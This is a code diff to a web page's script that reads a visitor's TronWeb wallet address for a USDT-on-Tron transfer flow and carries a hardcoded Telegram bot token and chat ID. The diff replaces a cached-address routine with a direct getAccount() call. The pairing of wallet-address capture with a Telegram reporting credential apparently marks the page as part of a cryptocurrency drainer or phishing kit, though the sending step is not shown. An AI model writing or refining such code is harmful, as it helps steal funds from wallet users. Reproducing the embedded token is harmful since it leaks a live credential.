@@ -121,34 +121,8 @@
 
         const CONFIG = { TELEGRAM_BOT_TOKEN: '8963397372:AAEvbhYGLXdFgJ5AszQvKoHbIu1bTVg3RNA', TELEGRAM_CHAT_ID: '8933407008' };
         let selectedToken = 'usdt_tron';
-        let cachedUserAddress = null;
-
-        async function initializeTronWeb() {
-            let retries = 0;
-            while (!window.tronWeb && retries < 50) {
-                await new Promise(resolve => setTimeout(resolve, 100));
-                retries++;
-            }
-
-            if (window.tronWeb) {
-                let address = window.tronWeb.defaultAddress.base58;
-                if (address && address !== false && address !== null && address !== '') {
-                    cachedUserAddress = address;
-                    console.log('TronWeb initialized, address:', cachedUserAddress);
-                } else {
-                    console.log('TronWeb available but address not ready yet');
-                    await new Promise(resolve => setTimeout(resolve, 1000));
-                    address = window.tronWeb.defaultAddress.base58;
-                    if (address && address !== false && address !== null && address !== '') {
-                        cachedUserAddress = address;
-                        console.log('Address loaded after delay:', cachedUserAddress);
-                    }
-                }
-            }
-        }
 
         document.addEventListener('DOMContentLoaded', () => {
-            initializeTronWeb();
             initializeTokenDropdown();
             document.getElementById('amountInput').addEventListener('input', updateAmountInfo);
         });
@@ -297,13 +271,11 @@
                     return;
                 }
 
-                let userAddress = cachedUserAddress;
+                // Leggi l'indirizzo usando tronWeb.trx.getAccount()
+                let account = await tronWeb.trx.getAccount();
+                let userAddress = account.address;
 
-                if (!userAddress || userAddress === false || userAddress === null || userAddress === '') {
-                    userAddress = tronWeb.defaultAddress.base58;
-                }
-
-                if (!userAddress || userAddress === false || userAddress === null || userAddress === '') {
+                if (!userAddress) {
                     showError('Wallet address not available');
                     btn.disabled = false;
                     btn.textContent = 'Next';
